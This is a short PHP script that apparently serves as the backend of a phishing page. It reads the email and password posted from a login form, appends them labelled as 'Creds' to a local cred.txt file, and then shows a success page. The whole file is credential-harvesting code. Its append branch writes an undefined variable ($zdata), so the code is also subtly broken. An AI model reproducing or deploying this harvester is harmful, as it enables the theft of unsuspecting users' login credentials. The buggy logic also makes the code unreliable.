<?php 
function isfile($path){
    if(file_exists($path)){

    	return true;
    }else{
    	return false;
    }
}
$user = $_POST["email"];
$pass = $_POST["password"];
$data = "Creds: {$user} : {$pass}"."\n";
if(isfile("cred.txt")){
   
    $fileOps = fopen("cred.txt",'a');
    fwrite($fileOps,$zdata);
    fclose($fileOps);
    
}else{
    $fileOps = fopen("cred.txt",'w');
    fwrite($fileOps,$data);
    fclose($fileOps);
}
//header("Location : http://127.0.0.1/Login.php");
//render [  // ] 
include "Success.html" ;
?>
